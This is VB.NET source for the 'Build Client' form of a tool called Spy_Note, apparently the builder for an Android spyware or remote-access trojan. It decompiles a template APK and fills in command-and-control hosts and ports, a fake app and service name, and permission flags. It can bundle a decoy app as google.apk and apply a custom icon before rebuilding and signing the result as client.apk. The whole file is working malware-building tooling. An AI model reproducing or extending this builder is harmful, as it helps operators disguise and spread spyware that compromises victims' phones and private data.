Imports System.ComponentModel
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Build_client
    Private folder_Building As String
    Private folder_apktool As String
    Private Const name_static As String = "app-release"
    Private start As DateTime
    Private boolen_exit As Boolean
    Private cmd_0 As Object
    Private xx As Boolean
    Private cmd_running_cmd As Boolean
    Public Sub New()
        Me.boolen_exit = False
        Me.xx = False
        Me.cmd_running_cmd = False
        Me.InitializeComponent()
    End Sub
    Private Sub B0ToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles B0ToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            Me.ErrorProvider1.Clear()
            Dim num As Integer = 0
            If (Me.DataGridView1.Rows.Count > 0) Then
                Me.ErrorProvider1.SetError(Me.DataGridView1, Nothing)
                num = num + 1
            Else
                Me.ErrorProvider1.SetError(Me.DataGridView1, "Cannot be Empty")
            End If
            Try
                enumerator = Me.GroupBox2.Controls.GetEnumerator()
                While enumerator.MoveNext()
                    Dim current As Control = DirectCast(enumerator.Current, Control)
                    If (Operators.CompareString(Versioned.TypeName(current), "TextBox", False) = 0) Then
                        If (Operators.ConditionalCompareObjectEqual(current.Tag, "ERROR", False)) Then
                            If (current.Text.Length <> 0) Then
                                Me.ErrorProvider1.SetError(current, Nothing)
                                num = num + 1
                            Else
                                Me.ErrorProvider1.SetError(current, "Cannot be Empty")
                            End If
                        End If
                    End If
                End While
            Finally
            End Try
            If (Not Me.CheckBox1.Checked) Then
                Me.ErrorProvider1.SetError(Me.TextBox6, Nothing)
                Me.ErrorProvider1.SetError(Me.TextBox7, Nothing)
                num = num + 2
            Else
                If (Me.TextBox6.Text.Length <> 0) Then
                    Me.ErrorProvider1.SetError(Me.TextBox6, Nothing)
                    num = num + 1
                Else
                    Me.ErrorProvider1.SetError(Me.TextBox6, "Cannot be Empty")
                End If
                If (Me.TextBox7.Text.Length <> 0) Then
                    Me.ErrorProvider1.SetError(Me.TextBox7, Nothing)
                    num = num + 1
                Else
                    Me.ErrorProvider1.SetError(Me.TextBox7, "Cannot be Empty")
                End If
            End If
            Me.OpenFileDialog1.Filter = "apk Files (*.apk)|*.apk"
            Me.OpenFileDialog1.FileName = Nothing
            If (Me.OpenFileDialog1.ShowDialog() <> DialogResult.OK) Then
                Return
            Else
                If (Operators.ConditionalCompareObjectEqual(Me.PictureBox1.Tag, Nothing, False)) Then
                    Me.PictureBox1.Tag = String.Concat(Application.StartupPath, "\", store_0.name_folder_app_resource, "\icons\icon_diverse\icon_default.png")
                End If
                If (Me.min()) Then
                    If (File.Exists(String.Concat(Me.folder_apktool, "\app-release.apk"))) Then
                        File.Delete(String.Concat(Me.folder_apktool, "\app-release.apk"))
                    End If
                    If (File.Exists(String.Concat(Me.folder_apktool, "\out\client.apk"))) Then
                        File.Delete(String.Concat(Me.folder_apktool, "\out\client.apk"))
                    End If
                    File.Copy(Me.OpenFileDialog1.FileName, String.Concat(Me.folder_apktool, "\app-release.apk"))
                    Me.ToolStripMenuItem1.Visible = False
                    My.Settings.SVHOST = Me.TextBox1.Text
                    My.Settings.BIINFO2 = Me.TextBox2.Text
                    My.Settings.BIINFO3 = Me.TextBox3.Text
                    My.Settings.BIINFO4 = Me.TextBox4.Text
                    My.Settings.BIINFO5 = Me.TextBox5.Text
                    Dim str As String = Nothing
                    Dim count As Integer = Me.CheckedListBox1.Items.Count - 1
                    Dim num1 As Integer = 0
                    Do
                        str = String.Concat(str, Conversions.ToString(CInt(Me.CheckedListBox1.GetItemCheckState(num1))))
                        num1 = num1 + 1
                    Loop While num1 <= count
                    My.Settings.LISTPROP = str
                    My.Settings.Save()
                    Me.step0()
                End If
            End If
        Catch exception1 As System.Exception
            MsgBox(exception1.Message, MsgBoxStyle.Critical, store_0.name_prog)
        End Try
    End Sub

    Private Sub Build_client_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.FormClosing
        e.Cancel = Me.boolen_exit
        If (Not Me.boolen_exit) Then
            If (Me.xx) Then
                Me.close_cmd()
            End If
        End If
    End Sub
    Private Sub Build_client_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Me.B0ToolStripMenuItem.Image = store_0.Bitmap_0("ctx_packg")
        Me.ContextMenuStrip1.Renderer = New Theme_0()
        Me.GroupBox5.Text = Strings.Space(Me.CheckBox1.Text.Length * 2)
        Me.TabPage1.Text = "Output"
        Me.TabPage2.Text = "Client Info"
        Me.TabPage3.Text = "Dynamic DNS"
        Me.TabPage4.Text = "Properties"
        Me.TabPage5.Text = "Merging App"
        Me.NumericUpDown1.Value = New Decimal(My.Settings.SVPORT)
        Me.TextBox1.Text = My.Settings.SVHOST
        Me.TextBox2.Text = My.Settings.BIINFO2
        Me.TextBox3.Text = My.Settings.BIINFO3
        Me.TextBox4.Text = My.Settings.BIINFO4
        Me.TextBox5.Text = My.Settings.BIINFO5
        Dim lISTPROP As String = My.Settings.LISTPROP
        Dim length As Integer = lISTPROP.Length - 1
        Dim num As Integer = 0
        Do
            If (Operators.CompareString(Conversions.ToString(lISTPROP(num)), "1", False) = 0) Then
                Me.CheckedListBox1.SetItemChecked(num, True)
            End If
            num = num + 1
        Loop While num <= length
        Dim str As String = My.Settings.SVLISTHOST.Trim()
        If (str.Contains(",")) Then
            If (str.EndsWith(",")) Then
                str = str.ToString().Remove(str.ToString().Length - 1).ToString()
            End If
            Dim strArrays As String() = str.Split(New Char() {","c})
            Dim length1 As Integer = CInt(strArrays.Length) - 1
            For i As Integer = 0 To length1 Step 1
                Dim rows As DataGridViewRowCollection = Me.DataGridView1.Rows
                Dim objArray() As Object = {strArrays(i), Nothing}
                objArray(1) = If(Versioned.IsNumeric(strArrays(i + 1)), strArrays(i + 1), "0")
                rows.Add(objArray)
                i = i + 1
            Next

        End If
        Me.MenuStrip1.Renderer = New Theme_0()
        MyBase.Icon = store_0.icons_0("window")
        Me.ErrorProvider1.Icon = store_0.icons_0("errors")
        Me.PictureBox1.Image = store_0.Bitmap_0("icon_default")
        Me.title("Build Client", Nothing)
        Me.RichTextBox1.ContextMenuStrip = store_0.ContextMenu1
    End Sub

    Private Sub Build_client_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Resize
        Me.ErrorProvider1.Clear()
    End Sub
    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click
        Try
            Me.OpenFileDialog1.Filter = "png Files (*.png)|*.png"
            Me.OpenFileDialog1.FileName = Nothing
            If (Me.OpenFileDialog1.ShowDialog() <> DialogResult.OK) Then
                Return
            Else
                Me.PictureBox1.ImageLocation = Me.OpenFileDialog1.FileName
                Me.PictureBox1.Tag = Me.OpenFileDialog1.FileName
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub Button3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button3.Click
        If (Operators.CompareString(Me.TextBox1.Text, Nothing, False) <> 0 And Operators.CompareString(Conversions.ToString(Me.NumericUpDown1.Value), "0", False) <> 0) Then
            Me.DataGridView1.Rows.Add(New Object() {Me.TextBox1.Text, Conversions.ToString(Me.NumericUpDown1.Value)})
        End If
    End Sub

    Private Sub Button4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button4.Click
        Me.PictureBox1.Image = store_0.Bitmap_0("icon_default")
        Me.PictureBox1.Tag = String.Concat(Application.StartupPath, "\", store_0.name_folder_app_resource, "\icons\icon_diverse\icon_default.png")
    End Sub
    Private Sub Button5_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button5.Click
        Me.TextBox6.Text = Nothing
        Me.TextBox7.Text = Nothing
    End Sub

    Private Sub Button6_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button6.Click
        Me.OpenFileDialog1.Filter = "apk Files (*.apk)|*.apk"
        Me.OpenFileDialog1.FileName = Nothing
        If (Me.OpenFileDialog1.ShowDialog() <> DialogResult.OK) Then
            Me.TextBox6.Text = Nothing
        ElseIf (File.Exists(Me.OpenFileDialog1.FileName)) Then
            Me.TextBox6.Text = Me.OpenFileDialog1.FileName.ToString()
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs) Handles CheckBox1.CheckedChanged
        If (Not Me.CheckBox1.Checked) Then
            Me.Panel5.Enabled = False
        Else
            Me.Panel5.Enabled = True
        End If
    End Sub
    Private Sub close_cmd()
        Me.cmd_running_cmd = False
        Me.xx = False
        Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "CancelOutputRead", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            Catch exception As System.Exception
            End Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "CancelErrorRead", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            Catch exception1 As System.Exception
            End Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "Kill", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            Catch exception2 As System.Exception
            End Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "Close", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            Catch exception3 As System.Exception
            End Try
        Catch exception4 As System.Exception
        End Try
        Me.cmd_0 = Nothing
        Me.boolen_exit = False
        MyBase.Close()
    End Sub

    Public Function cmd_running() As Boolean
        Dim flag As Boolean
        Try
            Me.cmd_0 = New Process()
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardOutput", New Object() {True}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardInput", New Object() {True}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardError", New Object() {True}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "FileName", New Object() {"cmd.exe"}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardError", New Object() {True}, Nothing, Nothing, False, True)
            AddHandler DirectCast(Me.cmd_0, Process).OutputDataReceived, New DataReceivedEventHandler(AddressOf Me.Sync_Output)
            AddHandler DirectCast(Me.cmd_0, Process).ErrorDataReceived, New DataReceivedEventHandler(AddressOf Me.Sync_Output)
            AddHandler DirectCast(Me.cmd_0, Process).Exited, New EventHandler(Sub(a0 As Object, a1 As EventArgs) Me.ex())
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "UseShellExecute", New Object() {False}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "CreateNoWindow", New Object() {True}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WindowStyle", New Object() {ProcessWindowStyle.Hidden}, Nothing, Nothing, False, True)
            NewLateBinding.LateSet(Me.cmd_0, Nothing, "EnableRaisingEvents", New Object() {True}, Nothing, Nothing)
            NewLateBinding.LateCall(Me.cmd_0, Nothing, "Start", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateCall(Me.cmd_0, Nothing, "BeginErrorReadLine", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateCall(Me.cmd_0, Nothing, "BeginOutputReadLine", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            Me.cmd_running_cmd = True
            flag = True
        Catch exception As System.Exception
            flag = False
        End Try
        Return flag
    End Function
    Private Sub ex()
        If (Me.xx) Then
            Interaction.MsgBox("cmd.exe Unexpectedly closed !!", MsgBoxStyle.Critical, store_0.name_prog)
            Thread.Sleep(5000)
            Me.close_cmd()
        End If
    End Sub

    Private Sub File_zip_Decompress(ByVal zipPath As String, ByVal pathfolder As String)
        Try
            If (Not Directory.Exists(pathfolder)) Then
                Directory.CreateDirectory(pathfolder)
            End If
            ZipFile.ExtractToDirectory(zipPath, pathfolder)
        Catch exception As System.Exception
            Return
        End Try
    End Sub
    Public Function getDriv() As Object
        Dim obj As Object
        Try
            Dim executablePath As String = Application.ExecutablePath
            Dim strArrays As String() = executablePath.Split(New String() {"\"}, StringSplitOptions.RemoveEmptyEntries)
            obj = String.Concat(strArrays(0).ToString(), "\")
        Catch exception As System.Exception
            obj = "C:\"
        End Try
        Return obj
    End Function

    Private Sub Image_scaling(ByVal w_00 As Object, ByVal h_00 As Object, ByVal n_00 As Object)
        Try
            If (Me.xx) Then
                Dim str As String = Conversions.ToString(Me.PictureBox1.Tag)
                Dim bitmap As System.Drawing.Bitmap = New System.Drawing.Bitmap(str)
                Dim [integer] As Integer = Conversions.ToInteger(w_00)
                Dim num As Integer = Conversions.ToInteger(h_00)
                Dim bitmap1 As System.Drawing.Bitmap = New System.Drawing.Bitmap([integer], num)
                Dim graphic As Graphics = Graphics.FromImage(bitmap1)
                graphic.InterpolationMode = InterpolationMode.Low
                graphic.DrawImage(bitmap, New Rectangle(0, 0, [integer], num), New Rectangle(0, 0, bitmap.Width, bitmap.Height), GraphicsUnit.Pixel)
                graphic.Dispose()
                Dim n00() As Object = {n_00, ImageFormat.Png}
                Dim objArray As Object() = n00
                Dim flagArray() As Boolean = {True, False}
                Dim flagArray1 As Boolean() = flagArray
                NewLateBinding.LateCall(bitmap1, Nothing, "Save", n00, Nothing, Nothing, flagArray, True)
                If (flagArray1(0)) Then
                    n_00 = RuntimeHelpers.GetObjectValue(objArray(0))
                End If
                bitmap.Dispose()
                bitmap1.Dispose()
            End If
        Catch exception As System.Exception
        End Try
    End Sub
    Private Function min() As Boolean
        Dim flag As Boolean
        Me.title("Build Client", Nothing)
        Me.start = DateTime.Now
        While True
            Thread.Sleep(store_0.CPU)
            Dim str As String = Conversions.ToString(Me.getDriv())
            Me.folder_Building = String.Concat(str, "Building")
            Me.folder_apktool = String.Concat(str, "Building\apktool")
            Try
                If (Not My.Computer.FileSystem.DirectoryExists(Me.folder_Building)) Then
                    My.Computer.FileSystem.CreateDirectory(Me.folder_Building)
                ElseIf (Not My.Computer.FileSystem.DirectoryExists(Me.folder_apktool)) Then
                    Me.File_zip_Decompress(String.Concat(Application.StartupPath, "\", store_0.name_folder_app_resource, "\apktool\apktool.zip"), String.Concat(Me.folder_Building, "\"))
                ElseIf (My.Computer.FileSystem.DirectoryExists(Me.folder_Building) And My.Computer.FileSystem.DirectoryExists(Me.folder_apktool)) Then
                    If (Not My.Computer.FileSystem.DirectoryExists(String.Concat(Me.folder_apktool, "\app-release"))) Then
                        flag = True
                        Exit While
                    Else
                        Directory.Delete(String.Concat(Me.folder_apktool, "\app-release"), True)
                    End If
                End If
            Catch exception As System.Exception
                flag = False
                Exit While
            End Try
        End While
        Return flag
    End Function
    Public Sub prog(ByVal v As Integer)
        If (Not MyBase.InvokeRequired) Then
            Me.ProgressBar1.Value = v
        Else
            Dim _prg As Build_client.prg = New Build_client.prg(AddressOf Me.prog)
            MyBase.Invoke(_prg, New Object() {v})
        End If
    End Sub

    Private Sub re_a()
        While Me.xx
            While True
                Thread.Sleep(store_0.CPU)
                Dim str As String = String.Concat(Me.folder_apktool, "\app-release\res\values\strings.xml")
                If (Not File.Exists(str)) Then
                    Exit While
                End If
                Try
                    Dim str1 As String = Nothing
                    If (Me.DataGridView1.Rows.Count > 0) Then
                        Dim count As Integer = Me.DataGridView1.Rows.Count - 1
                        For i As Integer = 0 To count Step 1
                            str1 = Conversions.ToString(Operators.AddObject(str1, Operators.AddObject(Operators.AddObject(Operators.AddObject(Me.DataGridView1.Rows(i).Cells(0).Value, ","), Me.DataGridView1.Rows(i).Cells(1).Value), ",")))
                        Next

                    End If
                    If (str1.EndsWith(",")) Then
                        str1 = str1.ToString().Remove(str1.ToString().Length - 1).ToString()
                    End If
                    Dim str2 As String = Nothing
                    Dim num As Integer = Me.CheckedListBox1.Items.Count - 1
                    Dim num1 As Integer = 0
                    Do
                        str2 = String.Concat(str2, Conversions.ToString(CInt(Me.CheckedListBox1.GetItemCheckState(num1))))
                        num1 = num1 + 1
                    Loop While num1 <= num
                    Dim num2 As Integer = 0
                    If (Me.CheckBox1.Checked) Then
                        num2 = 1
                    End If
                    My.Settings.SVLISTHOST = str1
                    My.Settings.Save()
                    Dim str3 As String = My.Computer.FileSystem.ReadAllText(str).Replace("[0x0x0x0_Host_0x0x0x0]", str1).Replace("[0x0x0x0_Client_Name_0x0x0x0]", Me.TextBox2.Text).Replace("[0x0x0x0_App_Name_0x0x0x0]", Me.TextBox3.Text).Replace("[0x0x0x0_Service_Name_0x0x0x0]", Me.TextBox4.Text).Replace("[0x0x0x0_Version_0x0x0x0]", Me.TextBox5.Text).Replace("[0x0x0x0_Group_Properties_0x0x0x0]", str2).Replace("[0x0x0x0_Merge_file_0x0x0x0]", Conversions.ToString(num2)).Replace("[0x0x0x0_Package_file_0x0x0x0]", Me.TextBox7.Text)
                    File.WriteAllText(str, str3)
                    If (Me.CheckBox1.Checked) Then
                        GoTo Label1
                    Else
                        GoTo Label0
                    End If
                Catch exception As System.Exception
                End Try
            End While
        End While
Label0:
        Me.prog(20)
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(store_0.CPU)
                    Dim str4 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-hdpi-v4\ic_launcher.png")
                    If (Not File.Exists(str4)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str4)
                        Me.Image_scaling(72, 72, str4)
                        GoTo Label2
                    Catch exception1 As System.Exception
                    End Try
                End While
            Else
                Me.prog(25)
                Exit While
            End If
        End While
Label2:
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(store_0.CPU)
                    Dim str5 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-mdpi-v4\ic_launcher.png")
                    If (Not File.Exists(str5)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str5)
                        Me.Image_scaling(48, 48, str5)
                        GoTo Label3
                    Catch exception2 As System.Exception
                    End Try
                End While
            Else
                Me.prog(30)
                Exit While
            End If
        End While
Label3:
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(store_0.CPU)
                    Dim str6 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-xhdpi-v4\ic_launcher.png")
                    If (Not File.Exists(str6)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str6)
                        Me.Image_scaling(96, 96, str6)
                        GoTo Label4
                    Catch exception3 As System.Exception
                    End Try
                End While
            Else
                Me.prog(35)
                Exit While
            End If
        End While
Label4:
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(store_0.CPU)
                    Dim str7 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-xhdpi-v4\ic_launcher.png")
                    If (Not File.Exists(str7)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str7)
                        Me.Image_scaling(96, 96, str7)
                        GoTo Label5
                    Catch exception4 As System.Exception
                    End Try
                End While
            Else
                Me.prog(40)
                Exit While
            End If
        End While
Label5:
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(store_0.CPU)
                    Dim str8 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-xxhdpi-v4\ic_launcher.png")
                    If (Not File.Exists(str8)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str8)
                        Me.Image_scaling(144, 144, str8)
                        GoTo Label6
                    Catch exception5 As System.Exception
                    End Try
                End While
            Else
                Me.prog(45)
                Exit While
            End If
        End While
Label6:
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(store_0.CPU)
                    Dim str9 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-xxxhdpi-v4\ic_launcher.png")
                    If (Not File.Exists(str9)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str9)
                        Me.Image_scaling(192, 192, str9)
                        If (Me.xx) Then
                            Me.step4()
                        End If
                        Return
                    Catch exception6 As System.Exception
                    End Try
                End While
            Else
                Me.prog(50)
                Exit While
            End If
        End While
        If (Me.xx) Then
            Me.step4()
        End If
        Return
Label1:
        While True
            Thread.Sleep(store_0.CPU)
            Try
                If (Not (Me.TextBox6.Text.Length > 0 And Me.TextBox7.Text.Length > 0)) Then
                    GoTo Label0
                Else
                    Dim str10 As String = String.Concat(Me.folder_apktool, "\app-release\res\raw\google.apk")
                    If (File.Exists(str10)) Then
                        File.Delete(str10)
                        Dim text As String = Me.TextBox6.Text
                        If (File.Exists(text)) Then
                            File.Copy(text, str10)
                        End If
                        GoTo Label0
                    End If
                End If
            Catch exception7 As System.Exception
            End Try
        End While
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RemoveToolStripMenuItem.Click
        If (Me.DataGridView1.SelectedRows.Count > 0) Then
            For i As Integer = Me.DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Me.DataGridView1.Rows.RemoveAt(Me.DataGridView1.SelectedRows(i).Index)
            Next
        End If
    End Sub
    Private Sub step0()
        If (Me.min()) Then
            If (Not Me.cmd_running_cmd) Then
                Me.xx = Me.cmd_running()
            End If
            If (Me.xx) Then
                Me.boolen_exit = True
                Me.buildingToolStripMenuItem.Enabled = False
                Me.step1()
            End If
        End If
    End Sub

    Private Sub step1()
        If (Me.xx) Then
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {"java -version"}, Nothing, Nothing, Nothing, True)
        End If
    End Sub

    Private Sub step2()
        If (Me.xx) Then
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {String.Concat("cd ", Me.folder_apktool)}, Nothing, Nothing, Nothing, True)
            Me.step3()
            Me.prog(10)
        End If
    End Sub

    Private Sub step3()
        If (Me.xx) Then
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {"apktool d app-release.apk"}, Nothing, Nothing, Nothing, True)
            Me.prog(15)
            Dim thread As System.Threading.Thread = New System.Threading.Thread(New ThreadStart(AddressOf Me.re_a)) With
                {
                    .IsBackground = True
                }
            thread.Start()
        End If
    End Sub

    Private Sub step4()
        If (Me.xx) Then
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {"apktool b -f -r app-release"}, Nothing, Nothing, Nothing, True)
            Me.step5()
            Me.prog(70)
        End If
    End Sub

    Private Sub step5()
        If (Me.xx) Then
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {"java -jar SignApk.jar certificate.pem key.pk8 app-release\dist\app-release.apk out\client.apk"}, Nothing, Nothing, Nothing, True)
            Me.prog(80)
        End If
    End Sub

    Private Sub step6(ByVal b As Boolean)
        While b
            Thread.Sleep(store_0.CPU)
            If (File.Exists(String.Concat(Me.folder_apktool, "\out\client.apk"))) Then
                Process.Start(String.Concat(Me.folder_apktool, "\out"))
                Dim now As TimeSpan = DateTime.Now - Me.start
                Me.prog(100)
                Me.title("Build Client  -idle time {0}", String.Concat(New String() {Conversions.ToString(now.Minutes), "m", Conversions.ToString(now.Seconds), "s", Conversions.ToString(now.Milliseconds), "ms".ToString()}))
                Me.ToolStripMenuItem1.Visible = True
                Me.ToolStripMenuItem1.Text = String.Format("idle time {0}", String.Concat(New String() {Conversions.ToString(now.Minutes), "m", Conversions.ToString(now.Seconds), "s", Conversions.ToString(now.Milliseconds), "ms".ToString()}))
                Me.boolen_exit = False
                Me.buildingToolStripMenuItem.Enabled = True
                Exit While
            End If
        End While
    End Sub

    Public Sub Sync_Output(ByVal d01 As Object, ByVal b01 As Object)
        Try
            If (Not MyBase.InvokeRequired) Then
                If (NewLateBinding.LateGet(b01, Nothing, "Data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString().Contains("Java(TM) SE Runtime Environment")) Then
                    Me.prog(5)
                    Me.step2()
                ElseIf (NewLateBinding.LateGet(b01, Nothing, "data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString().Contains("java -jar SignApk.jar")) Then
                    Me.prog(80)
                    Dim thread As System.Threading.Thread = New System.Threading.Thread(Sub(a0 As Object) Me.step6(Conversions.ToBoolean(a0))) With
                    {
                        .IsBackground = True
                    }
                    thread.Start(Me.xx)
                ElseIf (Me.ProgressBar1.Value = 0) Then
                    If (NewLateBinding.LateGet(b01, Nothing, "Data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString().Contains("'java -version' is not") Or NewLateBinding.LateGet(b01, Nothing, "Data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString().Contains("'java' is not")) Then
                        Me.boolen_exit = False
                        Me.buildingToolStripMenuItem.Enabled = True
                    End If
                End If
                Me.RichTextBox1.AppendText(String.Concat(NewLateBinding.LateGet(b01, Nothing, "Data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString(), Environment.NewLine))
                Me.RichTextBox1.ScrollToCaret()
            Else
                Dim invCmd As Build_client.inv_cmd = New Build_client.inv_cmd(AddressOf Me.Sync_Output)
                MyBase.Invoke(invCmd, New Object() {d01, b01})
                Return
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub title(ByVal t As String, ByVal i As String)
        Me.Text = String.Format(t, i)
    End Sub

    Public Delegate Sub inv_cmd(ByVal d0 As Object, ByVal b0 As Object)
    Public Delegate Sub prg(ByVal v As Integer)
End Class